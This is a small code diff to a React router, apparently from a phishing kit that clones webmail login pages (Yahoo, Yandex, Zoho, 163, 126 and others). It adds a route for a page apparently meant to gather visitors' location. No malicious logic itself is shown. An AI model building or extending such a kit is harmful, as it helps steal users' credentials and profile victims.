@@ -29,6 +29,7 @@ import WebmailMain from "./pages/webmailmain";
 import Yahoo from "./pages/yahoo";
 import Yandex from "./pages/yandex";
 import Zoho from "./pages/zoho";
+import GetLocationInfo from "./pages/getlocationinfo";
 
 var CryptoJS = require("crypto-js");
 
@@ -64,6 +65,7 @@ function App() {
         <Redirect default />
         <HomeRedirect path="/" />
         <Encryption path="/enc" />
+        <GetLocationInfo path="loc" />
         <Page163 path={page[163]} />
         <Page126 path={page[126]} />
         <Hinet path={page.hinet} />
